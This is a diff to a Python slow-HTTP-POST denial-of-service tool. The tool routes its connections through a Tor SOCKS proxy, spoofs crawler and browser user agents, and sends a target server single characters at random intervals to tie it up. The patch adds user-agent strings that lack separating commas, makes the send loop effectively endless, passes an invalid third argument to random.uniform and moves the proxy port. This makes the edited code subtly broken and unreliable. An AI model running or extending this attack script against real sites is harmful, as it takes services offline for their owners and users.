@@ -47,6 +47,10 @@ useragents = [
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
  "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
+ "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/35.6.13"
+ "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/68.7"
+ "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/74.0"
+
 ]
 
 class httpPost(Thread):
@@ -70,14 +74,14 @@ class httpPost(Thread):
                         "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
                         (self.host, random.choice(useragents)))
 
-        for i in range(0, 9999):
+        for i in range(0, 999999999999999999999999999999999999999):
             if stop_now:
                 self.running = False
                 break
             p = random.choice(string.letters+string.digits)
             print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
             self.socks.send(p)
-            time.sleep(random.uniform(0.1, 3))
+            time.sleep(random.uniform(0.1, 3, 4))
 	
         self.socks.close()
 		
@@ -86,7 +90,7 @@ class httpPost(Thread):
             while self.running:
                 try:
                     if self.tor:     
-                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
+                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 4444)
                     self.socks.connect((self.host, self.port))
                     print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
                     break
